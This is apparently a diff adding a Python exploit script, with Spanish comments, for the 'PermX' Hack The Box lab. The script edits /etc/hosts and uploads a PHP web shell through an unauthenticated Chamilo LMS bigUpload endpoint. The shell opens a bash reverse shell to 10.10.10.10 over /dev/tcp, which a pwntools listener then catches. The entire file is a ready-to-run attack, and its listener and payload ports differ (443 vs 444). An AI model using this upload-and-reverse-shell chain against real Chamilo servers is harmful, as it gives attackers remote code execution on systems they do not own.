@@ -1,0 +1,70 @@
+#!/usr/bin/python3
+
+from pwn import *
+import os
+import requests
+import signal
+import sys
+import threading
+
+# Colores
+RED = "\033[31m"
+GREEN = "\033[32m"
+RESET = "\033[0m"
+BLUE = "\033[34m"
+
+### Cancelar Script ###
+
+def def_handler(sig, frame):
+    print(f"{RED}\n[+] Saliendo...\n{RED}")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+#Variables
+main_url = "http://lms.permx.htb"
+endpoint = "/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
+uploads = "/main/inc/lib/javascript/bigupload/files/"
+lport = 443
+
+#Agregar DNS al /etc/hosts
+dns = "10.10.11.23 permx.htb lms.permx.htb"
+path_hosts= "/etc/hosts"
+
+def add_hosts():
+
+    with open(path_hosts, "r") as file:
+        lines = file.readlines()
+    if dns not in lines:
+        with open(path_hosts, "a") as file:
+            file.write(dns)
+        print(f"{GREEN}Hosts agregados al archivo /etc/hosts.\n{RESET}")
+    else:
+        print(f"{BLUE}Los hosts ya existen en tu archivo /etc/hosts.\n{RESET}")
+
+#Subir Web Shell
+filename = "my_web_shell.php"
+payload = """<?php system("bash -c 'bash -i >& /dev/tcp/10.10.10.10/444 0>&1'"); ?>""" ### <----- Change IP & PORT
+file_to_upload = {'bigUploadFile': (filename, payload)}
+
+def upload_file():
+
+    response = requests.post(main_url+endpoint, files=file_to_upload)
+    if response.status_code == 200:
+        print(response.text)
+    else:
+        print(f"Error: {response.status_code}")
+    
+    response = requests.get(main_url+uploads+filename)
+
+if __name__ == "__main__":
+
+    add_hosts()   
+    try:
+        threading.Thread(target=upload_file, args=()).start()
+    except Exception as e:
+        log.error(str(e))
+
+    shell = listen(lport, timeout=15).wait_for_connection()
+
+    shell.interactive()
